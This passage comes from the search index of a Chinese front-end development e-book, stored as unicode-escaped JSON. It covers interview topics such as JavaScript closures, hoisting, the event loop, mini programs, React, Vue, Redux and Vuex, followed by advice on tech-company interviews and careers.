<p>\u95ed\u5305\u7684\u597d\u5904\uff1a\u5916\u90e8\u51fd\u6570\u8fd4\u56de\u5185\u90e8\u51fd\u6570\u3002\u591a\u6b21\u6267\u884c\u5185\u90e8\u51fd\u6570\u65f6\uff0c\u5b58\u653e\u5728\u5916\u90e8\u51fd\u6570\u4e2d\u7684\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a\u88ab\u6e05\u9664\uff0c\u53ef\u4ee5\u4e34\u65f6\u5b58\u50a8\u6570\u636e\u3002\uff08\u5ef6\u957f\u5916\u90e8\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f\uff09</p> <p>\u5982\u679c\u6ee5\u7528\u95ed\u5305\uff0c\u53ef\u80fd\u9020\u6210\u5185\u5b58\u6cc4\u6f0f\u3002</p> <pre><code>function fun() {\n    var count = 1;\n    return () =&gt; {\n        console.log(count);\n    }\n}\nvar fn = fun();\nfn(); // \u6267\u884c\u5185\u90e8\u51fd\u6570\u65f6\u3002\u7528\u5230\u5916\u90e8\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\nfn();\n</code></pre> <p>\u95ed\u5305\u7684\u5f15\u7528\u573a\u666f</p> <pre><code>function fun() {\n    var count = 1;\n    return function() {\n        count++;\n        console.log(count);\n    }\n}\n\nvar fun2 = fun();\nfun2();\nfun2();\n// 2 3\n</code></pre> <p>\u4e0b\u9762\u662f\u590d\u6742\u7684\u6848\u4f8b</p> <pre><code>function fun(n, o) {\n    console.log(o); // \u6253\u5370\u7684\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\n    return {\n        fun: function(m) {\n            return fun(m, n);\n            // \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5916\u90e8\u53c2\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n        }\n    }\n}\n\nvar a = fun(0); // \u7b2c\u4e8c\u4e2a\u53c2\u6570\u6ca1\u6709\u4f20\uff0c\u6253\u5370 undefined\na.fun(1); // \u6267\u884c\u5185\u90e8\u51fd\u6570 fun(1, 0) \u6253\u5370\u7ed3\u679c\u662f0\na.fun(2); // \u6267\u884c\u5185\u90e8\u51fd\u6570 fun(2, 0) \u6253\u5370\u7ed3\u679c\u662f0\na.fun(3); // \u6267\u884c\u5185\u90e8\u51fd\u6570 fun(3, 0) \u6253\u5370\u7ed3\u679c\u662f0\n\nvar b = fun(0).fun(1).fun(2).fun(3);\n// undefined, 0, 1, 2 \n// \u7b2c\u4e00\u4e2a\u51fd\u6570\u6267\u884c\u662f undefined \u548c\u7b2c\u4e00\u4e2a\u4e00\u6837\n// \u7b2c\u4e8c\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de function(1) { fun(1, 0) } \u7136\u540e\u6253\u53700\n// \u7b2c\u4e09\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de function(2) { fun(2, 1) } \u7136\u540e\u6253\u53701\n\nvar c = fun(0).fun(1); //undefined/0\nc.fun(2); // 1\nc.fun(3); // 1\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#18","title":"18. \u53d8\u91cf\u63d0\u5347 &amp;&amp; \u6267\u884c\u4e0a\u4e0b\u6587","text":"<p>\u53d8\u91cf\u5b9a\u4e49\u548c\u51fd\u6570\u5b9a\u4e49\uff0c\u53d8\u91cf\u7684\u58f0\u660e\u4f1a\u63d0\u5347\u5230\u9876\u90e8\uff0c\u53d8\u91cf\u7684\u8d4b\u503c\u4e0d\u4f1a\u63d0\u5347\u3002</p> <p>\u51fd\u6570\u4f1a\u5168\u90e8\u63d0\u5347\u5230\u9876\u90e8</p> <pre><code>console.log(a); // undefined\nvar a = 10;\nconsole.log(a); // 10\n\nfn();\nfunction fn() {\n    console.log(1);\n}\n</code></pre> <p>\u6267\u884c\u4e0a\u4e0b\u6587\uff08EC\uff09execute context\uff1a\u4ee3\u7801\u6267\u884c\u524d\uff0c\u6839\u636e\u4e0a\u4e0b\u6587\u8fdb\u884c\u53d8\u91cf\u63d0\u5347\u3002\u786e\u8ba4 this \u7684\u6307\u5411\uff1b\u521b\u5efa\u4f5c\u7528\u57df\u94fe\uff08\u5168\u5c40\u4f5c\u7528\u57df\u3001\u51fd\u6570\u4f5c\u7528\u57df\uff09</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#19-nodejs","title":"19. \u5b8f\u4efb\u52a1\u548c\u5fae\u4efb\u52a1-NodeJS","text":"<p>\u6267\u884c\u5b8c\u4e00\u8f6e\u5b8f\u4efb\u52a1\uff0c\u770b\u770b\u662f\u5426\u6709\u5fae\u4efb\u52a1\uff1b\u5982\u679c\u6709\u5fae\u4efb\u52a1\u5c31\u6267\u884c\u3002\u7136\u540e\u5f00\u59cb\u4e0b\u4e00\u6b21\u8f6e\u8bad\uff0c\u6267\u884c\u4e0b\u4e00\u4e2a\u5b8f\u4efb\u52a1\u3002</p> <p>\u5b8f\u4efb\u52a1\uff1asetTimeout setInterval requestAnimationFrame\uff1a\u5b8f\u4efb\u52a1\u961f\u5217\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7b2c\u4e00\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1-\u6267\u884c\u4e3b\u7ebf\u7a0b\u7684JS\u4ee3\u7801</p> <p>\u5fae\u4efb\u52a1\uff1anew Promise().then(callback) process.nextTick\uff1a\u53ea\u6709\u4e00\u4e2a\u5fae\u4efb\u52a1\u961f\u5217\u3002\u5728\u4e0a\u4e00\u4e2a\u5b8f\u4efb\u52a1\u5168\u90e8\u6267\u884c\u5b8c\u6bd5\uff0c\u5982\u679c\u6709\u5fae\u4efb\u52a1\uff0c\u5c31\u4f1a\u7acb\u523b\u6267\u884c\u5fae\u4efb\u52a1\u4e2d\u7684\u5168\u90e8\u961f\u5217\u3002</p> <p>\u6240\u6709\uff0c\u6267\u884c\u7684\u6d41\u7a0b\u662f\uff1a\u7b2c\u4e00\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217\uff08\u4e3b\u7ebf\u7a0b\uff09+\u5fae\u4efb\u52a1\u961f\u5217\uff08\u5982\u679c\u6709\u5c31\u6267\u884c\uff09+\u7b2c\u4e8c\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217+\u7b2c\u4e09\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217\u3002\u3002\u3002</p> <pre><code>console.log(1);\n\nsetTimeout(() =&gt; {\n    console.log(2);\n}, 0);\n\nsetTimeout(() =&gt; {\n    console.log(3);\n},100);\n\nnew Promise((resolve, reject) =&gt; {\n    console.log(4);\n    reject(); // \u8fd9\u4e2a\u6267\u884c\u540e\uff0c\u4e0b\u9762\u7684resolve\u4e0d\u4f1a\u6267\u884c\u3002\n    resolve();\n}).then(() =&gt; {\n    console.log(5);\n}).catch(() =&gt; {\n    console.log(6);\n});\n\nconsole.log(7);\n// 147(\u7b2c\u4e00\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217)  6\uff08\u5fae\u4efb\u52a1\u961f\u5217\uff092\uff08\u7b2c\u4e8c\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217\uff093\uff08\u7b2c\u4e09\u4e2a\u5b8f\u4efb\u52a1\u961f\u5217\uff09\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#20","title":"20. \u5c0f\u7a0b\u5e8f\u5feb\u901f\u5165\u95e8","text":"<ul> <li> <p>\u5c0f\u7a0b\u5e8f\uff1a\u6253\u5305\u540e\u4ee3\u7801\u4e0d\u8d85\u8fc72M\uff1b\u4e3b\u8981\u4f9d\u636e\u5fae\u4fe1\u5b98\u65b9\u5f00\u53d1\u8005\u6587\u6863\uff1b\u5f00\u53d1\u5de5\u5177\u4e5f\u662f\u5fae\u4fe1\u5f00\u53d1\u5de5\u5177\uff08APPID\uff09</p> </li> <li> <p>\u5f00\u53d1\u8005\u5de5\u5177\uff1a\u6a21\u62df\u5668+\u8c03\u8bd5\u5668+\u7f16\u8f91\u5668\u3002</p> </li> <li>project.config.json \u8bbe\u7f6e\u9879\u76ee\u7684\u8c03\u8bd5\u76ee\u5f55\u3002</li> <li>app.js app.json app.wxss \u8fd9\u91cc\u662f\u6839\u7ec4\u4ef6\u7684\u90e8\u5206</li> <li>pages \u662f\u4e0d\u540c\u5b50\u9875\u9762\uff1b\u9875\u9762\u4e2d\u7ed3\u6784+\u6837\u5f0f+\u884c\u4e3a\u4e00\u4e00\u5bf9\u5e94\u3002\u8fd9\u91cc\u4f7f\u7528\u5fae\u4fe1\u81ea\u5b9a\u4e49\u7684\u683c\u5f0f\uff08View button text image block\uff09\u3002 <pre><code>&lt;view class=\"container\"&gt;\n    &lt;view class=\"userinfo\"&gt;\n        &lt;text class=\"user-metto\"&gt;{{motto}}&lt;/text&gt;\n    &lt;/view&gt;\n&lt;/view&gt;\n</code></pre> JS \u4e2d\u5904\u7406\u4e8b\u4ef6</li> </ul> <pre><code>const app = getApp();\n\nPage({\n    data: {\n        motto: 'Hello World',\n        userInfo: {},\n        hasUserInfo: false,\n        canIUse: wx.canIUse('button.open-type.getUserInfo')\n    },\n    bindViewTap: function() {\n        wx.navigateTo({\n            url: '../logs/logs'\n        })\n    },\n})\n</code></pre> <p>\u5177\u4f53\u7684\u914d\u7f6e\u5728\u5fae\u4fe1\u5b98\u65b9\u6587\u6863\u4e2d\u6709</p> <p>data \u53ef\u4ee5\u76f4\u63a5\u5728WXML\u4e2d\u901a\u8fc7\u6a21\u677f\u83b7\u53d6\u5230\u7684\u6570\u636e</p> <p>\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u5df2\u7ecf\u505a\u4e86\u5b8c\u7f8e\u9002\u914d\uff0c\u4e0d\u9700\u8981\u8003\u8651\u79fb\u52a8\u7aef\u9002\u914d\uff0c\u5355\u4f4d\u662f vpx</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#21-mpvue","title":"21. \u5c0f\u7a0b\u5e8f\u548cmpVue\u5bf9\u6bd4\u7b80\u4ecb","text":"<p>\u5c0f\u7a0b\u5e8f\u6709\u4e13\u95e8\u7684\u6846\u67b6\uff0cwepy\uff0cmpvue (mini program Vue)</p> <p>\u8fd9\u4e2a\u8bed\u6cd5\u548c VUE \u57fa\u672c\u4e00\u81f4\uff08\u9700\u8981\u7684\u65f6\u5019\u518d\u5b66\u4e60\uff09</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#22-reactvues","title":"22. \u6bd4\u8f83React\u4e0eVues","text":"<p>\u76f8\u540c\u70b9\uff1a - \u7ec4\u4ef6\u5316\uff1b\u4f7f\u7528 props \u8fdb\u884c\u7236\u5b50\u7ec4\u4ef6\u6570\u636e\u4f20\u9012 - \u865a\u62dfDOM\uff0c\u4e0d\u9700\u8981\u76f4\u63a5\u64cd\u4f5cDOM - \u6570\u636e\u9a71\u52a8\u66f4\u65b0 - \u670d\u52a1\u5668\u7aef\u6e32\u67d3;\u79fb\u52a8\u7aef\u539f\u751f\u6e32\u67d3\uff08React Native\uff09</p> <p>\u4e0d\u540c\u70b9\uff1a - Vue \u53cc\u5411\u7ed1\u5b9a\uff1bReact \u5355\u5411\u7ed1\u5b9a - \u7ec4\u4ef6\u5199\u6cd5\uff1aReact \u662fJSX\uff0cVUE \u662f\u5355\u6587\u4ef6\u5f62\u5f0f\uff0cHTML+CSS+JS\u5728\u4e00\u4e2a\u6a21\u677f\u6587\u4ef6\u4e2d - state\uff1aReact\u9700\u8981 setState \u66f4\u65b0\u72b6\u6001\uff0cVUE\u4f7f\u7528data\u5c5e\u6027\u7ba1\u7406 - \u865a\u62dfDOM\uff1aVUE\u6839\u636e\u4f9d\u8d56\u5173\u7cfb\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u6e32\u67d3\u5168\u90e8\u7ec4\u4ef6\uff1bReact\u4e2d\uff0c\u72b6\u6001\u6539\u53d8\u4f1a\u6e32\u67d3\u5168\u90e8\u7684\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7 pureComponent or shouldComponentUpdate \u63a7\u5236\u7ec4\u4ef6\u7684\u66f4\u65b0</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#23-redux","title":"23. Redux\u7ba1\u7406\u72b6\u6001\u7684\u673a\u5236","text":"<ul> <li> <p>Redux\uff1a\u662f\u4e00\u4e2a\u4e13\u95e8\u505a\u72b6\u6001\u7ba1\u7406\u7684JS\u5e93\uff0c\u4e0d\u662fReact\u7684\u63d2\u4ef6\uff0c\u53ef\u4ee5\u96c6\u4e2d\u7ba1\u7406React\u4e2d\u591a\u4e2a\u7ec4\u4ef6\u5171\u4eab\u7684\u72b6\u6001\u548c\u4ece\u540e\u53f0\u83b7\u53d6\u7684\u6570\u636e\u3002</p> </li> <li> <p>\u5de5\u4f5c\u673a\u5236\uff1aRedux \u5206\u6210\u4e09\u90e8\u5206\uff1astore(\u5305\u542bstate\uff0c\u5b58\u50a8\u6570\u636e\uff0c\u4e0ereact\u7ec4\u4ef6\u8fdb\u884c\u6570\u636e\u4ea4\u6d41)\u3001reducers\uff08\u4ea7\u751f\u6570\u636e\uff0c\u66f4\u65b0store\u4e2d\u7684state\uff09\u3001action creator\uff08\u4e8b\u4ef6\u9a71\u52a8\u72b6\u6001\u66f4\u65b0\uff09\u3002</p> </li> <li> <p>\u4e3b\u8981\u65b9\u6cd5\uff1agetState \u83b7\u53d6state\uff1bdispatch\uff08action\uff09\u6d3e\u53d1\u4e8b\u4ef6\uff1bstore.subscribe(listener) \u8ba2\u9605\u4e8b\u4ef6\u3002</p> </li> <li> <p>\u6269\u5c55\uff1areact-redux\uff0credux-thunk\uff0cRedux DevTools \u7b49\u5de5\u5177</p> </li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#24-vue","title":"24. \u8bf4\u8bf4Vue\u7ec4\u4ef6\u95f4\u901a\u4fe1\u65b9\u5f0f","text":"<p>\u901a\u4fe1\u5bf9\u8c61\uff1a\u7236\u5b50\u901a\u4fe1\uff0c\u9694\u4ee3\u901a\u4fe1\u3001\u5144\u5f1f\u901a\u4fe1</p> <p>\u65b9\u5f0f\uff1aprops\uff0c\u81ea\u5b9a\u4e49\u4e8b\u4ef6\uff0c\u6d88\u606f\u7684\u8ba2\u9605\u53d1\u5e03\uff0cVuex\uff0cslot \u4f20\u9012\u5b50\u5143\u7d20\u3002\u901a\u5e38\u4f7f\u7528 Props \u4f20\u9012\uff08\u53ef\u4ee5\u4f20\u9012\u4e00\u822c\u5c5e\u6027\u6216\u8005\u56de\u8c03\u51fd\u6570\uff09\uff0c\u9694\u4ee3\u4f20\u9012\u6216\u8005\u5144\u5f1f\u4f20\u9012\u4e0d\u9002\u5408\u3002\u81ea\u5b9a\u4e49\u4e8b\u4ef6\uff1a\u8ba2\u9605\u4e8b\u4ef6\u3001\u89e6\u53d1\u4e8b\u4ef6\uff1bvuex \u662fVUE\u72b6\u6001\u7ba1\u7406\u5e93\uff0c\u53ef\u4ee5\u5904\u7406\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\u3002</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#25-vuex","title":"25. Vuex\u7ba1\u7406\u72b6\u6001\u7684\u673a\u5236","text":"<p>Vuex \u662f VUE \u7684\u72b6\u6001\u7ba1\u7406\u7684\u63d2\u4ef6\uff1b\u53ef\u4ee5\u96c6\u4e2d\u7ba1\u7406\u591a\u4e2a VUE \u591a\u4e2a\u7ec4\u4ef6\u5171\u4eab\u7684\u72b6\u6001\uff0c\u4ee5\u53ca\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u7684\u6570\u636e\u3002</p> <ul> <li>state \u8d1f\u8d23\u5b58\u50a8\u72b6\u6001\uff08$store.state mapState() getters\uff09</li> <li>actions \u8d1f\u8d23\u5904\u7406\u4e8b\u4ef6\uff08$store.dispatch()/mapActions()\uff09\uff0c\u548c\u540e\u7aef\u4ea4\u4e92\u6570\u636e(commit)</li> <li>mutations \u5728\u6570\u636e\u66f4\u65b0\u540e\uff0c\u76f4\u63a5\u66f4\u65b0 state</li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#26-vuemvvm","title":"26. \u8bf4\u8bf4Vue\u7684MVVM\u5b9e\u73b0\u539f\u7406","text":"<p>\u6a21\u677f\u89e3\u6790\uff08\u89e3\u6790\u5927\u62ec\u53f7\u8868\u8fbe\u5f0f\u2014\u2014\u89e3\u6790\u6307\u4ee4\uff09</p> <p>\u6570\u636e\u7ed1\u5b9a\uff08\u5b9e\u73b0\u66f4\u65b0\u663e\u793a\uff09</p> <p>observer \u89c2\u5bdf\u76d1\u89c6data\u4e2d\u6240\u6709\u5c42\u7ea7\u7684\u5c5e\u6027\uff0ccompile \u7f16\u8bd1\u6a21\u677f\uff1b\u521d\u59cb\u5316\u754c\u9762\uff0cwatcher\u66f4\u65b0\u754c\u9762\u3002</p> <ul> <li>\u6ce8\u610f\uff1a\u540e\u9762\u51e0\u90e8\u5206\u662fVUE\u6216\u8005\u5c0f\u7a0b\u5e8f\uff0c\u5b9e\u9645\u4e0d\u4f7f\u7528\uff0c\u6240\u4ee5\u9700\u8981\u7684\u65f6\u5019\u518d\u8bf4\u3002</li> </ul>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/","title":"\u9762\u8bd5\u7ecf\u9a8c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7505  \u9605\u8bfb16\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_2","title":"\u516c\u53f8\u4ecb\u7ecd","text":"<p>\u8f6c\u578b\uff0c\u6216\u8005\u6362\u5de5\u4f5c\uff0c\u9700\u8981\u505a\u597d\u51c6\u5907\uff0c\u601d\u8003\u672a\u6765\u53d1\u5c55\u3002</p> <p>\u5927\u516c\u53f8\u7684\u7ade\u4e89\u6bd4\u8f83\u6fc0\u70c8\u3002</p> <p>\u5927\u516c\u53f8\u8003\u6838\u7efc\u5408\u80fd\u529b\uff0c\u60c5\u5546\uff0c\u6c9f\u901a\u80fd\u529b\uff0c\u8fd9\u90e8\u5206\u4f1a\u8d85\u8fc7\u6280\u672f\u80fd\u529b\u3002</p> <p>\u85aa\u6c34\uff1a\u817e\u8baf&gt;\u652f\u4ed8\u5b9d&gt;\u767e\u5ea6</p> <p>\u5927\u516c\u53f8\u5e73\u53f0\u9ad8\uff0c\u7136\u540e\u9886\u5bfc\u5173\u7cfb\u4e5f\u5f88\u91cd\u8981\uff08\u9886\u5bfc\u63d0\u643a\uff0c\u7136\u540e\u53ef\u4ee5\u63d0\u5347\uff09</p> <p>\u8682\u8681\u91d1\u670d\uff08\u652f\u4ed8\u5b9d\uff09\uff1a\u52a0\u73ed\u6bd4\u8f83\u591a\uff1b\u665a\u4e0a11\uff1a30\u4e0b\u73ed\uff0c\u53cc\u5341\u4e00\u671f\u95f4\uff1b\u62fc\u547d\u3002\u4e00\u76f4\u62fc\u547d\u4e0d\u662f\u6b63\u5e38\u72b6\u6001\u3002\u963f\u91cc\u6ca1\u6709\u52a0\u73ed\u8d39\uff0c\u4f01\u4e1a\u6587\u5316\u3002</p> <p>\u5934\u6761\u3001\u5feb\u624b\u90fd\u6bd4\u8f83\u7d2f\uff0c\u6d3b\u6bd4\u8f83\u591a\u3002</p> <p>\u767e\u5ea6\u4e00\u822c\u57288-9\u70b9\u4e0b\u73ed\u3002</p> <p>\u81ea\u5df1\u66f4\u9002\u5408\u505a\u6280\u672f\uff0c\u8fd8\u662f\u9002\u5408\u505a\u5176\u4ed6\u7684\u89d2\u8272\uff0c\u4e86\u89e3\u81ea\u5df1\u3002</p> <p>\u5927\u7684\u65b9\u5411\uff1a\u662f\u5426\u505a\u4e92\u8054\u7f51\uff0c\u662f\u5426\u8fd8\u8981\u5199\u4ee3\u7801\uff1f\u53d1\u89c9\u81ea\u5df1\u7684\u7279\u70b9\u7684\u5fc3\u7406\u72b6\u6001\u3002P6 \u51c6\u5907\u5728\u7ba1\u7406\u7ea7\u522b\u8f6c\uff0c\u5546\u4e1a\u8fd0\u8425\u51c6\u5907\u3002PM \u4ea4\u4e92 UE\uff08\u8bbe\u8ba1\uff09UI\uff08\u4ea4\u4e92\uff09 QA\uff08\u6d4b\u8bd5+\u8bbe\u8ba1\uff09 \u524d\u7aef\u8f6c\u7b97\u6cd5\u6216\u8005\u540e\u7aef\u6709\u96be\u5ea6\u3002\u884c\u4e1a\u662f\u5426\u66f4\u6362\uff0c\u804c\u4e1a\u662f\u5426\u66f4\u6362\u3002\u4ea7\u54c1\u7684\u6c9f\u901a\u80fd\u529b\u548c\u60c5\u5546\u9700\u8981\u5f88\u9ad8\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u5408\u7406\u7684\u7406\u7531\uff0c\u4e0d\u8981\u9891\u7e41\u8df3\u69fd\uff08\u4e5f\u8981\u8df3\u69fd\uff09</p> <p>\u5929\u6d25\u79d1\u6280\u5927\u5b66\u7684\u4e00\u4e2a\u5b66\u6e23-2011\u5e74\u6bd5\u4e1a\u7684\u524d\u7aef\u5de5\u7a0b\u5e08</p> <p>\u4eba\u8109\u548c\u53e3\u7891\uff0c\u4f60\u4e0d\u77e5\u9053\u4f60\u6362\u5de5\u4f5c\u4f1a\u9047\u5230\u4ec0\u4e48\u4eba\u3002\u81f3\u5c11\u4e0d\u5f97\u7f6a\u81ea\u5df1\u7684\u4e0a\u53f8\u3002\u6548\u7387\uff01\uff01\uff01</p> <p>\u7b80\u5386\u907f\u514d\u9020\u5047\uff08\u53ef\u80fd\u62c9\u5230\u9ed1\u540d\u5355\uff09\uff1b\u6a21\u7cca\u7684\u8bf4\u6cd5\uff1b\u5de5\u7a0b\u7c7b\u4e0d\u662f\u7b97\u6cd5\uff0c\u5bf9\u5b66\u5386\u8981\u6c42\u6ca1\u6709\u5f88\u4e25\u683c\u8981\u6c42\uff0c\u4e3b\u8981\u662f\u6280\u672f\u3002</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_3","title":"\u4e00\u9762\uff1a\u57fa\u7840\u77e5\u8bc6","text":"<p>\u81ea\u6211\u4ecb\u7ecd\uff1a\u7b80\u5355\u4ecb\u7ecd\u5de5\u4f5c\u65f6\u95f4\u548c\u7ecf\u5386\uff0c\u81ea\u5df1\u4e3b\u8981\u7684\u5de5\u4f5c\u4efb\u52a1\u548c\u6280\u672f\u6808\uff0c\u4e3a\u4ec0\u4e48\u8981\u6765\uff08\u5e73\u53f0\uff0c\u5b66\u77e5\u8bc6\uff09\uff1f5\u5206\u949f\u5de6\u53f3\u3002\u7a7f\u8863\u6b63\u5f0f\u5e72\u51c0\u4e00\u70b9\uff0c\u6d17\u5934\u53d1\u3002</p> <p>\u57fa\u7840\u77e5\u8bc6\u91cd\u8981\uff0c80%\uff08\u5f88\u91cd\u8981\uff09\uff0c\u6ca1\u6709\u6280\u5de7\u548c\u6377\u5f84\uff0c\u6398\u91d1\u7b49\u3002\u56fd\u5185\u524d\u7aef\u5bf9\u4e8e\u7b97\u6cd5\u9898\u76ee\u8003\u5bdf\u4e0d\u591a\u3002\u57fa\u7840\u662f\u5173\u952e\u3002\u62db\u4eba\u662f\u5e72\u6d3b\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u7279\u522b\u591a\u7684\u725b\u903c\u7b97\u6cd5\uff08\u5e38\u89c4\u7684\u6392\u5e8f\u7b97\u6cd5\u4e5f\u9700\u8981\u5b9e\u73b0\uff09\u3002\u9700\u8981\u624b\u5199\u7b97\u6cd5\uff08\u4ee3\u7801\uff09\uff0c\u5728\u7eb8\u4e0a\u9762\u5199\u3002\u5e73\u65f6\u53bb\u79ef\u7d2f\u7b97\u6cd5\u3002\u539f\u7406\u4e0a\u9762\u600e\u4e48\u5b9e\u73b0\u3002\u5982\u679c\u9898\u76ee\u4e0d\u4f1a\uff0c\uff08\u8bbe\u8ba1\u4e00\u4e2a\u4ec0\u4e48\u7ec4\u4ef6\uff09\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bf4\u4e0d\u4f1a\uff0c\u6211\u6709\u70b9\u61f5\uff0c\u6211\u8bf4\u4e00\u4e0b\u601d\u8def\u3002\u57fa\u7840\u77e5\u8bc6\u4f9d\u9760\u80cc\u8bf5\uff01\uff01\uff01\u9762\u8bd5\u51c6\u5907\u4e00\u4e2a\u6708\uff0c\u65f6\u95f4\u957f\u4f1a\u5fd8\u8bb0\u3002\u9762\u8bd5\u9700\u8981\u5237\u9898\u3002</p> <ul> <li> <p>CSS\uff1a\u9884\u5904\u7406\u5668\u95ee\u7684\u6bd4\u8f83\u591a</p> </li> <li> <p>\u79fb\u52a8\u7aef\uff1a\u4f1a\u95eeH5\u3001rem\u8ba1\u7b97\u5355\u4f4d\u3002\u5404\u79cd\u673a\u578b\u7684\u9002\u914d\uff0c\u5c4f\u5e55\u7684\u9002\u914d\u7b49\u7b49\u3002</p> </li> <li> <p>\u6846\u67b6\uff1aReact+VUE</p> </li> <li> <p>JS \uff1a\u4e8b\u4ef6\u5faa\u73af\u673a\u5236\uff08\u5b8f\u4efb\u52a1\u5fae\u4efb\u52a1\uff09\u8de8\u57df\u3001this\u3001\u51fd\u6570\u8282\u6d41\u9632\u6296\u3001new \u5bf9\u8c61\u7684\u8fc7\u7a0b\u3001\u6df1\u62f7\u8d1d\u6d45\u62f7\u8d1d\uff1b\u7ee7\u627f\u3002promise.race</p> </li> <li> <p>HTTP\uff1a\u6d4f\u89c8\u5668\u89e3\u6790\u8fc7\u7a0b\uff08URL\u5230\u754c\u9762\u6e32\u67d3\uff09\uff0c\u7406\u89e3\u539f\u7406+\u6027\u80fd\u4f18\u5316\uff1b\u8fd9\u4e2a\u9898\u76ee\u5f88\u7ec6\u81f4\uff0c\u6d89\u53ca\u5230\u77e5\u8bc6\u70b9\uff1bJS\u5f02\u6b65\u52a0\u8f7d async \u5173\u8054\u77e5\u8bc6\u70b9\u7b49\u3002\u6d4f\u89c8\u5668\u7f13\u5b58\u3001\u5f3a\u7f13\u5b58\u3001\u534f\u5546\u7f13\u5b58\uff1bcookie session \u5206\u522b\u5b58\u5728\u54ea\u91cc\uff1f cookie \u5b58\u5728\u6d4f\u89c8\u5668\uff0csession \u5b58\u5728\u670d\u52a1\u5668\u3002 HTTPS\u63e1\u624b\u8fc7\u7a0b\uff0c\u52a0\u5bc6\u7b97\u6cd5\u3002HTTP 2.0 \u548c 1.1 \u7684\u533a\u522b\uff1b\u591a\u8def\u590d\u7528\u3002\u62a5\u6587\u4f20\u8f93\u7684\u5b57\u6bb5\u3002CSRF XSS \u8fd9\u90e8\u5206\u5076\u5c14\u95ee\u4e00\u4e0b\u3002</p> </li> <li> <p>\u7b97\u6cd5\uff1a\u5192\u6ce1\u3001\u5feb\u62cd\u3001\u4e8c\u5206\u67e5\u627e\u3002 \u5934\u6761\u548c\u5feb\u624b\u559c\u6b22\u95ee\u7b97\u6cd5\uff1bBAT\u95ee\u7684\u7b97\u6cd5\u4e0d\u591a\u3002</p> </li> <li> <p>\u6027\u80fd\u95ee\u9898\uff1a\u4f18\u5316\u9996\u5c4f\u52a0\u8f7d\u65f6\u95f4\uff08\u670d\u52a1\u7aef\u5b9e\u73b0SSR\uff09</p> </li> </ul> <p>\u672a\u6765\u53d1\u5c55\u3001\u4e3a\u4ec0\u4e48\u76ee\u524d\u9009\u62e9\u8fd9\u4e2a\u673a\u4f1a</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_4","title":"\u4e8c\u9762\uff1a\u9879\u76ee","text":"<p>\u9879\u76ee\uff1a\u505a\u4e86\u4ec0\u4e48\uff0c\u5b9e\u73b0\u4e86\u4ec0\u4e48\u6837\u7684\u95ee\u9898\uff1b\u5177\u4f53\u7684\u5b9e\u73b0\u601d\u8def\u662f\u4ec0\u4e48\uff1f\u9879\u76ee\u8981\u5177\u4f53\u5f04\u660e\u767d\u3002\u7b80\u5386\u4e0a\u9762\u51992-3\u4e2a\u9879\u76ee</p> <p>\u6280\u672f\u65b9\u9762\uff1a</p> <ul> <li>\u91cd\u6784\u7684\u6a21\u5757\uff1f\u91cd\u6784\u4e3a\u4ec0\u4e48\uff0c\u81ea\u5df1\u8bbe\u8ba1\u7684\u601d\u8def\uff0c\u63d0\u9ad8\u4e86\u6027\u80fd\uff0c\u4ee3\u7801\u91cf\u51cf\u5c11\u4e86\uff1f\u8bbe\u8ba1\u6587\u6863\u3002\u91cd\u6784\u9879\u76ee\u52a0\u5206\u3002</li> <li>\u5b9e\u73b0\u67d0\u4e2a\u5bcc\u6587\u672c\u7f16\u8f91\u5668</li> <li>\u5b9e\u73b0\u67d0\u4e2a\u8f7b\u91cf\u7ea7\u6570\u636e\u5e93\u524d\u7aef\u754c\u9762</li> 